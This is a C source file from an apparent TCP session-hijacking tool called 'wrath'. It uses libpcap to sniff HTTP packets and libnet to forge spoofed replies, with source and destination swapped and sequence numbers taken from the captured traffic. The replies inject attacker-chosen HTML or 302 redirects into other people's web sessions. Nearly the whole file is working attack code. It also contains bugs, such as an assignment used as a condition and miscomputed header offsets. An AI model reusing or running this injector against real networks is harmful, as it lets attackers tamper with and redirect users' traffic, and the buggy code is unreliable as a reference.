#include <libnet.h>
#include <pcap.h>
#include "wrath-structs.h"
#include "wrath-utils.h"
#include "wrath-applevel.h"

void wrath_build_and_launch(u_char *, const u_char *, struct inject_package *);

void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
	struct lcp_package *package = (struct lcp_package *) args;
	libnet_t *libnet_handle = package->libnet_handle;
	struct arg_values *cline_args = package->cline_args;
	struct inject_package i_pack;
	
	/* test for input file:
		if an input file exists, assume it contains all encoding information.
		read the file's data onto the heap.
		present the pointer to wrath_build.
	
	   if an input file does not exist see if an operation does.
	   
	   if an operation does not exist only pass null pointer.
	*/


	if (strstr(packet + LIBNET_ETH_H + (2 * LIBNET_TCP_H) , "HTTP") != NULL) {
		printf("HTTP Packet sniffed\n");
		wrath_build_and_launch(args, packet, NULL);	
	}
}

void wrath_build_and_launch(u_char *args, const u_char *packet, struct inject_package *i_pack) {
	struct lcp_package *package = (struct lcp_package *) args;
	libnet_t *libnet_handle = package->libnet_handle;
	struct arg_values *cline_args = package->cline_args;

	struct libnet_ipv4_hdr *iphdr;
	struct libnet_tcp_hdr *tcphdr;

	/*
	char *payload;
	if (strcmp(cline_args->command, "\0") != 0) {
		payload = cline_args->command;
	}
	else {
	*/
	//char payload[] = "HTTP/1.1 302 Found\r\nLocation:http://ada.evergreen.edu/~stenic05\r\n\r\n";
	//char payload[] = "HTTP/1.1 302 Found\r\nLocation:http://en.wikipedia.org/wiki/Tupac_Shakur\r\n\r\n";
	char payload[] = "HTTP/1.1 200 OK\r\nServer: Apache\r\n\r\n<html><a href=\"http://ada.evergreen.edu/~stenic05\">visit</a></html>";

	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

	printf("Hijacking ... ");
	printf("%s:%hu -->", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport)); // ip_src and ip_dst are in_addr structs
	printf(" %s:%hu\n", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport));
	printf("With ... ");
	printf("%s:%hu -->", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport)); // ip_src and ip_dst are in_addr structs
	printf(" %s:%hu ", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport));
	printf(": %s\n", payload);

	printf("TCP SUM: %d\n", (cline_args->tcp_fin + cline_args->tcp_rst + cline_args->tcp_syn + cline_args->tcp_ack + cline_args->tcp_urg + cline_args->tcp_psh));

	
	/* libnet_build_tcp */
	libnet_build_tcp(
	ntohs(tcphdr->th_dport),	// source port (preted to be from destination port)
	ntohs(tcphdr->th_sport),	// destination port (pretend to be from source port)
	ntohl(tcphdr->th_ack),		// +(calc_len(upper_level)),	// seq (pretend to be next packet)
	ntohl(tcphdr->th_seq),		// ack
	(cline_args->tcp_rst
	+ cline_args->tcp_fin
	+ cline_args->tcp_syn
	+ cline_args->tcp_ack
	+ cline_args->tcp_urg
	+ cline_args->tcp_psh),		// flags	
	4096,				// window size -- the higher this is the least likely fragmentation will occur
	0,				// checksum: 0 = libnet auto-fill
	0,				// URG pointer	
	0,				// len
	(u_int8_t *)payload,			// *payload (maybe app-level here)
	sizeof(payload),			// payload length
	libnet_handle,			// pointer libnet context	
	0);				// ptag: 0 = build a new header
	
	libnet_build_ipv4(LIBNET_TCP_H, // length
	IPTOS_LOWDELAY,			// type of service
	libnet_get_prand(LIBNET_PRu16), // IP ID (serial)
	0,				// fragmentation
	128,				// TTL should be high to avoid being dropped in transit to a server
	IPPROTO_TCP,			// upper-level protocol
	0,				// checksum: 0 = libnet auto-fill
	iphdr->ip_dst.s_addr,  		// source (pretend to be destination)
	iphdr->ip_src.s_addr,  		// destination (pretend to be source)
	NULL,				// optional payload
	0,				// payload length
	libnet_handle,			// pointer libnet context
	0);				// ptag: 0 = build a new header	

	libnet_write(libnet_handle);

	if (cline_args->sleep_time = -1) 	
		usleep(5000);		// jump out of the storm 
	else 
		usleep(cline_args->sleep_time);
}
